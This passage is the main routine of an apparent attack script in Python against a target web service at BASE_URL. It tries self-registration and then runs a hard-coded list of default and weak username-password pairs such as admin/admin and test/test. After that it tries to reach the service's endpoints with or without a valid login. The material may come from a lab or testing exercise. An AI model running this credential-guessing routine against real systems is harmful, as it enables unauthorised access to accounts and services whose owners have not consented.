    print("[*] Starting authentication attempt...")
    print(f"[*] Target: {BASE_URL}")
    
    authenticated = False
    
    # Try registration first
    if attempt_registration():
        authenticated = True
    
    # If registration didn't work, try common credentials
    if not authenticated:
        print("\n[*] Registration didn't work, trying common credentials...")
        common_creds = [
            ("user", "password"),
            ("alice", "alice"),
            ("bob", "bob"),
            ("admin", "password"),
            ("admin", "admin"),
            ("test", "test")
        ]
        
        for username, password in common_creds:
            if attempt_login(username, password):
                authenticated = True
                break
    
    # Access endpoints if authenticated
    if authenticated:
        print("\n[+] Authentication successful! Accessing endpoints...")
        access_endpoints()
    else:
        print("\n[-] Could not establish authenticated session")
        print(f"[-] Final session cookies: {dict(SESSION.cookies)}")
        
        # Try accessing endpoints anyway - maybe no auth required
        print("\n[*] Attempting to access endpoints without authentication...")
        access_endpoints()

if __name__ == "__main__":
    main()

